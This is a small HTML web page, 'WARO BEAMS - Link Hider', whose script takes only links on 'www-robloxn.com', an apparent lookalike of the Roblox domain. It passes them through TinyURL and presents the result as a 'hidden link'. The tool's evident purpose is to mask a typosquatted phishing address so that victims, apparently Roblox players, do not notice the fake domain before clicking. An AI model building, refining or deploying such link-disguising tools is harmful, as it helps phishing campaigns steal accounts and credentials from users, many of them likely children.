<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WARO BEAMS - Link Hider</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap');

    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      font-family: 'Orbitron', sans-serif;
      background: #0b0000;
      color: #ff3b3b;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }

    .centered {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      width: 90%;
      max-width: 600px;
    }

    h1 {
      font-size: 3rem;
      margin-bottom: 2rem;
      text-shadow: 0 0 10px red;
    }

    input {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.05);
      color: #fff;
      margin-bottom: 1rem;
    }

    button {
      padding: 12px 30px;
      font-size: 1.1rem;
      background-color: #a80000;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #ff0000;
    }

    #result {
      margin-top: 1.5rem;
      font-size: 1.1rem;
      color: #00ff88;
      word-break: break-word;
    }

    a {
      color: #00ff88;
      text-decoration: none;
      font-weight: bold;
    }

    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

<canvas id="background"></canvas>

<div class="centered">
  <h1>WARO BEAMS</h1>
  <input id="linkInput" type="text" placeholder="Enter a https://www-robloxn.com/ link" />
  <br />
  <button onclick="shortenLink()">Hide Link</button>
  <div id="result"></div>
</div>

<script>
  // Background line animation
  const canvas = document.getElementById('background');
  const ctx = canvas.getContext('2d');

  function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }

  window.addEventListener('resize', resizeCanvas);
  resizeCanvas();

  const lines = Array.from({ length: 50 }, () => ({
    x: Math.random() * canvas.width,
    y: Math.random() * canvas.height,
    speed: 0.5 + Math.random(),
    length: 100 + Math.random() * 100,
    angle: Math.random() * Math.PI * 2,
  }));

  function draw() {
    ctx.fillStyle = 'rgba(11, 0, 0, 0.1)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.strokeStyle = 'rgba(255, 0, 0, 0.6)';
    ctx.lineWidth = 1;

    for (const line of lines) {
      ctx.beginPath();
      const x2 = line.x + Math.cos(line.angle) * line.length;
      const y2 = line.y + Math.sin(line.angle) * line.length;
      ctx.moveTo(line.x, line.y);
      ctx.lineTo(x2, y2);
      ctx.stroke();

      line.x += Math.cos(line.angle) * line.speed;
      line.y += Math.sin(line.angle) * line.speed;

      if (line.x > canvas.width || line.x < 0 || line.y > canvas.height || line.y < 0) {
        line.x = Math.random() * canvas.width;
        line.y = Math.random() * canvas.height;
      }
    }

    requestAnimationFrame(draw);
  }

  draw();

  // Link hider logic
  async function shortenLink() {
    const input = document.getElementById('linkInput').value.trim();
    const result = document.getElementById('result');

    if (!input.startsWith('https://www-robloxn.com/')) {
      result.style.color = 'red';
      result.textContent = '❌ Invalid link! Must start with https://www-robloxn.com/';
      return;
    }

    result.style.color = '#ff3b3b';
    result.textContent = 'Generating shortened link...';

    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(input)}`);
      const shortUrl = await response.text();

      result.style.color = '#00ff88';
      result.innerHTML = `✅ Your hidden link:<br><a href="${shortUrl}" target="_blank">${shortUrl}</a>`;
    } catch (error) {
      result.style.color = 'red';
      result.textContent = 'Error generating short link.';
      console.error(error);
    }
  }
</script>

</body>
</html>
